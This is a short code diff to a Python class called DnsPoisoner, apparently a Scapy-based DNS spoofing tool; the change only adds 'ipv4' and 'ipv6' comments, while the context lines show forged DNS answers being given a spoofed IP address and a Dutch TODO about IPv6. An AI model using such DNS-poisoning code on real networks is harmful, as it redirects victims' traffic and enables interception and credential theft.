@@ -47,6 +47,7 @@ class DnsPoisoner():
 
         if ip_to_spoof:
 
+            # ipv4
             if packet[DNSQR].qtype == 1:
                 packet[DNSRR].rdata = ip_to_spoof
                 packet[DNS].ancount = 1
@@ -55,6 +56,7 @@ class DnsPoisoner():
                 del(packet[UDP].len)
                 del(packet[UDP].chksum)
             
+            # ipv6
             elif packet[DNSQR].qtype == 28:
                 pass # TODO wat te doen met ipv6?
 
